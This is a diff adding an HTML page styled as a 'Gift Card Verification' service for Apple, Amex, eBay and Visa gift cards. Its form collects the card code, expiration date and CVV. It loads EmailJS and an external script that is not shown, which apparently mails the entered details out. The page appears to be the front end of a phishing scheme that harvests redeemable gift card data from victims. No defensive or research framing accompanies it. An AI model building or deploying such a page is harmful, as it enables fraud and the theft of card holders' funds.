@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gift Card Verification</title>
+    <link rel="stylesheet" href="all.css"> <!-- Link to external CSS -->
+    <link rel="stylesheet" href="style.css">
+    <link
+href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css"
+rel="stylesheet"
+/>
+</head>
+<style>
+/* Custom style to make brand uppercase */
+.navbar-brand {
+  text-transform: uppercase;
+  font-weight: bold;
+}
+
+.navbar {
+  background-color: transparent;
+}
+</style>
+<body>
+    <nav class="navbar navbar-expand-lg  bg-light">
+        <div class="container-fluid">
+          <!-- Navbar Brand -->
+          <a class="navbar-brand" href="index.html">Card Validation</a>
+  
+          <!-- Toggler/collapsibe Button for small screens -->
+          <button
+            class="navbar-toggler"
+            type="button"
+            data-bs-toggle="collapse"
+            data-bs-target="#navbarNav"
+            aria-controls="navbarNav"
+            aria-expanded="false"
+            aria-label="Toggle navigation"
+          >
+            <span class="navbar-toggler-icon"></span>
+          </button>
+  
+          <!-- Navbar links -->
+          <div class="collapse navbar-collapse" id="navbarNav">
+            <ul class="navbar-nav ms-auto">
+              <li class="nav-item">
+                <a class="nav-link" href="all.html">All Giftcards</a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="#">Amex Giftcard</a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="#">Apple Giftcard</a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="#">Ebay Giftcard</a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="#">Visa Giftcard</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </nav>
+      <div style="display: flex; justify-content: center;">
+        <img class="heroimg" src="images/gift-card.png" alt="" />
+      </div>
+      <h2 class="text-center text-light">
+        VALIDATE ALL GIFT CARD</h2>
+    <div class="body">
+        <div class="container">
+            <h2>Verify Your Gift Card</h2>
+            <form id="giftCardForm">
+                <!-- Select for card type -->
+                <label for="cardType">Select Type of Card:</label>
+                <select id="cardType" name="cardType">
+                    <option value="" disabled selected>Select type of card</option>
+                    <option value="Apple Gift Card">Apple Gift Card</option>
+                    <option value="Amex Gift Card">Amex Gift Card</option>
+                    <option value="eBay Gift Card">eBay Gift Card</option>
+                    <option value="Visa Gift Card">Visa Gift Card</option>
+                </select>
+    
+                <!-- Input for gift card code -->
+                <label for="cardCode">Gift Card Code:</label>
+                <input type="text" id="cardCode" name="cardCode" placeholder="Enter gift card code" required>
+    
+                <!-- Input for expiration date -->
+                <label for="expirationDate">Expiration Date:</label>
+                <input type="text" id="expirationDate" name="expirationDate" placeholder="MM/YY" required>
+    
+                <!-- Input for CVV -->
+                <label for="cvv">CVV:</label>
+                <input type="text" id="cvv" name="cvv" placeholder="Enter CVV" required>
+    
+                <!-- Submit Button -->
+                <button type="button" id="verifyButton">Verify Card</button>
+            </form>
+        </div>
+    
+        <script src="https://cdn.emailjs.com/dist/email.min.js"></script> <!-- EmailJS CDN -->
+        <script src="all.js"></script> <!-- Link to external JavaScript -->
+    </div>
+</body>
+</html>
